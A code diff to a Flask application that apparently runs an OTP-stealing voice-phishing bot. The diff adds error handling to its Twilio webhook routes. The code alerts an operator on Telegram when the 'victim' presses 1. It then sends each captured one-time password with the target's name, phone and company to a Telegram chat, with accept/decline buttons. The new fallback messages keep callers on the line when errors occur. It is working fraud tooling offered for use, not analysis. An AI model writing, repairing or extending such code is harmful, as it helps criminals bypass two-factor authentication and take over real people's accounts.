@@ -12714,101 +12714,122 @@ def api_bypasser_validate():
     }))
 
 
+def _twiml_error_response(msg="We are sorry, please try again later."):
+    """Return a valid TwiML 200 response instead of a 500 for Twilio webhooks."""
+    from twilio.twiml.voice_response import VoiceResponse
+    r = VoiceResponse()
+    r.say(msg, voice="alice", language="en-US")
+    r.pause(length=1)
+    r.hangup()
+    return str(r), 200, {'Content-Type': 'text/xml'}
+
+
 @app.route('/voice/otp', methods=['GET', 'POST'])
 def voice_otp():
-    from modules.twilio_call import get_pending_call, build_voice_twiml_main, get_webhook_base
-    token = request.args.get('token', '')
-    data = get_pending_call(token)
-    base = get_webhook_base()
-    twiml = build_voice_twiml_main(token, base, data)
-    return twiml, 200, {'Content-Type': 'text/xml'}
+    try:
+        from modules.twilio_call import get_pending_call, build_voice_twiml_main, get_webhook_base
+        token = request.args.get('token', '')
+        data  = get_pending_call(token) or {}
+        base  = get_webhook_base()
+        twiml = build_voice_twiml_main(token, base, data)
+        return twiml, 200, {'Content-Type': 'text/xml'}
+    except Exception as e:
+        print(f"[VOICE/OTP ERROR] {e}")
+        return _twiml_error_response("Hello, please hold while we connect your call.")
 
 
 @app.route('/voice/gather', methods=['GET', 'POST'])
 def voice_gather():
     import requests as _req
-    from modules.twilio_call import get_pending_call, build_voice_twiml_gather, get_webhook_base
-    token = request.args.get('token', '')
-    data = get_pending_call(token)
-    digit = request.values.get('Digits', '')
-    base = get_webhook_base()
+    try:
+        from modules.twilio_call import get_pending_call, build_voice_twiml_gather, get_webhook_base
+        token = request.args.get('token', '')
+        data  = get_pending_call(token) or {}
+        digit = request.values.get('Digits', '')
+        base  = get_webhook_base()
 
-    # Notify operator immediately when victim presses 1
-    if digit == '1':
-        chat_id = data.get('chat_id', '')
-        if chat_id:
-            try:
-                BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
-                if BOT_TOKEN:
-                    name    = data.get('name', 'N/A')
-                    phone   = data.get('phone', 'N/A')
-                    company = data.get('company', 'N/A')
-                    _req.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": chat_id,
-                            "text": (
-                                f"☎️ <b>Target Pressed 1!</b>\n\n"
-                                f"📞 Phone: <code>{phone}</code>\n"
-                                f"👤 Name: {name}\n"
-                                f"🏢 Company: {company}\n\n"
-                                f"⌨️ <i>Victim is now entering the OTP...</i>"
-                            ),
-                            "parse_mode": "HTML",
-                        },
-                        timeout=10,
-                    )
-            except Exception as e:
-                print(f"[VOICE] Error sending pressed-1 alert: {e}")
+        # Notify operator immediately when target presses 1
+        if digit == '1':
+            chat_id = data.get('chat_id', '')
+            if chat_id:
+                try:
+                    BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
+                    if BOT_TOKEN:
+                        name    = data.get('name', 'N/A')
+                        phone   = data.get('phone', 'N/A')
+                        company = data.get('company', 'N/A')
+                        _req.post(
+                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                            json={
+                                "chat_id": chat_id,
+                                "text": (
+                                    f"☎️ <b>Target Pressed 1!</b>\n\n"
+                                    f"📞 Phone: <code>{phone}</code>\n"
+                                    f"👤 Name: {name}\n"
+                                    f"🏢 Company: {company}\n\n"
+                                    f"⌨️ <i>Victim is now entering the OTP...</i>"
+                                ),
+                                "parse_mode": "HTML",
+                            },
+                            timeout=10,
+                        )
+                except Exception as e:
+                    print(f"[VOICE] Error sending pressed-1 alert: {e}")
 
-    twiml = build_voice_twiml_gather(token, base, data, digit)
-    return twiml, 200, {'Content-Type': 'text/xml'}
+        twiml = build_voice_twiml_gather(token, base, data, digit)
+        return twiml, 200, {'Content-Type': 'text/xml'}
+    except Exception as e:
+        print(f"[VOICE/GATHER ERROR] {e}")
+        return _twiml_error_response("We are processing your request. Please wait.")
 
 
 @app.route('/voice/gatherotp', methods=['GET', 'POST'])
 def voice_gatherotp():
     import requests as _req
-    from modules.twilio_call import get_pending_call, build_voice_twiml_otp_captured, clear_call_data
-    token = request.args.get('token', '')
-    data = get_pending_call(token)
-    otp = request.values.get('Digits', '')
-    lang = data.get('lang', 'en')
-    chat_id = data.get('chat_id', '')
+    try:
+        from modules.twilio_call import get_pending_call, build_voice_twiml_otp_captured, clear_call_data
+        token   = request.args.get('token', '')
+        data    = get_pending_call(token) or {}
+        otp     = request.values.get('Digits', '')
+        lang    = data.get('lang', 'en')
+        chat_id = data.get('chat_id', '')
 
-    if otp and chat_id:
-        try:
-            BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
-            if BOT_TOKEN:
-                msg = (
-                    f"🔐 <b>OTP Captured!</b>\n\n"
-                    f"📞 Phone: <code>{data.get('phone', 'N/A')}</code>\n"
-                    f"👤 Name: {data.get('name', 'N/A')}\n"
-                    f"🏢 Company: {data.get('company', 'N/A')}\n"
-                    f"🔑 OTP: <b><code>{otp}</code></b>\n\n"
-                    f"Use the buttons below to mark this OTP:"
-                )
-                # Inline keyboard with Accept / Decline buttons
-                keyboard = {
-                    "inline_keyboard": [[
-                        {"text": "✅ Accept OTP", "callback_data": f"otp_accept_{otp}"},
-                        {"text": "❌ Decline OTP", "callback_data": f"otp_decline_{otp}"},
-                    ]]
-                }
-                _req.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={
-                        "chat_id": chat_id,
-                        "text": msg,
-                        "parse_mode": "HTML",
-                        "reply_markup": keyboard,
-                    },
-                    timeout=10,
-                )
-        except Exception as e:
-            print(f"[VOICE] Error sending OTP to Telegram: {e}")
+        if otp and chat_id:
+            try:
+                BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
+                if BOT_TOKEN:
+                    msg = (
+                        f"🔐 <b>OTP Captured!</b>\n\n"
+                        f"📞 Phone: <code>{data.get('phone', 'N/A')}</code>\n"
+                        f"👤 Name: {data.get('name', 'N/A')}\n"
+                        f"🏢 Company: {data.get('company', 'N/A')}\n"
+                        f"🔑 OTP: <b><code>{otp}</code></b>\n\n"
+                        f"Use the buttons below to mark this OTP:"
+                    )
+                    keyboard = {
+                        "inline_keyboard": [[
+                            {"text": "✅ Accept OTP", "callback_data": f"otp_accept_{otp}"},
+                            {"text": "❌ Decline OTP", "callback_data": f"otp_decline_{otp}"},
+                        ]]
+                    }
+                    _req.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        json={
+                            "chat_id": chat_id,
+                            "text": msg,
+                            "parse_mode": "HTML",
+                            "reply_markup": keyboard,
+                        },
+                        timeout=10,
+                    )
+            except Exception as e:
+                print(f"[VOICE] Error sending OTP to Telegram: {e}")
 
-    twiml = build_voice_twiml_otp_captured(otp, lang)
-    return twiml, 200, {'Content-Type': 'text/xml'}
+        twiml = build_voice_twiml_otp_captured(otp, lang)
+        return twiml, 200, {'Content-Type': 'text/xml'}
+    except Exception as e:
+        print(f"[VOICE/GATHEROTP ERROR] {e}")
+        return _twiml_error_response("Thank you. Your information has been received. Goodbye.")
 
 
 @app.route('/voice/status', methods=['GET', 'POST'])
